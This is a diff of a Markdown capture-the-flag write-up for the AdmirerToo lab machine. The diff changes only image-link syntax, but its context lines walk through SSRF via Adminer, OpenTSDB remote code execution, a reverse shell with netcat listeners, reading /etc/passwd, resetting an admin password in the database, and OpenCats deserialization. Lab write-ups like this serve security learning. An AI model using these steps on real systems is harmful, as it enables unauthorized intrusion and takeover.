@@ -76,7 +76,7 @@ Lets add `db.admirer-gallery.htb` to our `/etc/hosts` file too.
 
 ### DB.ADMIRER.GALLERY.HTB
 Accessing http://db.admirer-gallery.htb we get the Adminer v4.7.8 portal:
-![[admirertoo/images/image1.png]]
+![](images/image1.png)
 We have access to database via web. Let’s enter and look for any interesting tables. just hit enter, and we are in.
 There’s only one table and nothing really interesting in that. The reason why it didn’t ask for any credentials is that the credentials are hard-coded in the page and POST them once we click on "enter" button"
 ```html
@@ -147,7 +147,7 @@ So, we need to edit `Auth Driver` value and `Auth Server` value. According to PO
 After changing the both values, I couldn’t get a hit on our python script. Then I looked into the source of `Adminer` at https://github.com/vrana/adminer/tree/master/adminer/drivers:
 
 As you can see the source code, the driver name is just `elastic` not `elasticsearch`. This is the reason it didn’t work. Let’s change both values one more time.
-![[admirertoo/images/image2.png]]
+![](images/image2.png)
 
 We get a hit:
 ```bash
@@ -157,7 +157,7 @@ $ python3 redirector.py 80 'http://127.0.0.1'
 ```
 
 We got the `index.html` source of target port 80. This simply means, we can access any locally running service.
-![[admirertoo/images/image3.png]]
+![](images/image3.png)
 
 As we saw in our initial port scan that three ports are filtered. Let’s try to access them via SSRF. Setup redirector for any of the three filtered ports.
 ```bash
@@ -166,7 +166,7 @@ $ python3 redirector.py 80 'http://127.0.0.1:4242'
 
 Intercept the login request once again and check the webpage.
 We got the response and the title of the page is "OpenTSDB".
-![[admirertoo/images/image4.png]]
+![](images/image4.png)
 
 According to [CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-18666/product_id-47794/Opentsdb-Opentsdb.html) there are 4 vulnerabilities for "OpenTSDB". Two of them are Code Execution. But we need to find the right version information of running application. To get version information, we can use the below endpoint.
 ```bash
@@ -207,7 +207,7 @@ $ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&en
 ```
 
 Success! We get RCE!
-![[admirertoo/images/image5.png]]
+![](images/image5.png)
 
 ### RCE
 Ok, now lets get a reverse shell. Make sure to put the payload inside single quotes and urlencode:
@@ -225,7 +225,7 @@ $ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&en
 ```
  
  Start a netcat listener on port 9001, intercept the database login and modify the parameters to trigger the SSRF -> RCE and we are in:
- ![[admirertoo/images/image6.png]]
+ ![](images/image6.png)
 
 ## Shell as opentsdb
 From here we can get the `/etc/passwd` to check the users in the machine:
@@ -344,7 +344,7 @@ $ ssh -L 9000:127.0.0.1:8080 jennifer@10.10.11.137
 ```
 
 Browsing to http://localhost:9000/ we see OpenCats website and version 0.9.5.2:
-![[admirertoo/images/image7.png]]
+![](images/image7.png)
 
 This version has a deserialization vulnerability, [CVE2021-25-294](https://www.cvedetails.com/cve/CVE-2021-25294/), that can lead to remote command execution. But we need to authenticate in the web application first.
 
@@ -402,7 +402,7 @@ Rows matched: 1  Changed: 1  Warnings: 0
 ```
 
 Great, now we can login as `admin:password123` in the website portal:
-![[admirertoo/images/image8.png]]
+![](images/image8.png)
 
 There is a [blog by Snoopy Security](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html) that explains how to exploit that CVE, we can read and follow along.
 
@@ -499,7 +499,7 @@ $ nc -nvlkp 43 -c "cat shell"
 $ nc -lnvp 9001
 ```
 
-![[admirertoo/images/image9.png]]
+![](images/image9.png)
 
 Step 5 - Now we go to the OpenCats website, click on the vulnerable "Date", intercept the request and modify the parameter with our generated serialized object of step 2.
 
